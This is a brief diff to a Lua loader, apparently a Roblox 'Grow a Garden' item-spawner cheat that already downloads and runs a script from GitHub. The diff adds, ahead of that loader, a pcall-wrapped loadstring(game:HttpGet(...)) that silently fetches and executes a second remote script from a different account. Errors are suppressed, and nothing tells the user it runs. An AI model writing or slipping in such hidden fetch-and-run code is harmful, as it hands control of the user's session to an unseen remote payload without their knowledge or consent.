@@ -1,3 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0fyz11/GAG-Spawner/refs/heads/main/ScriptMain", true))()
+end)
+
 local Spawner = 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaGay/femboy/refs/heads/main/GardenSpawner.lua"))
 ()
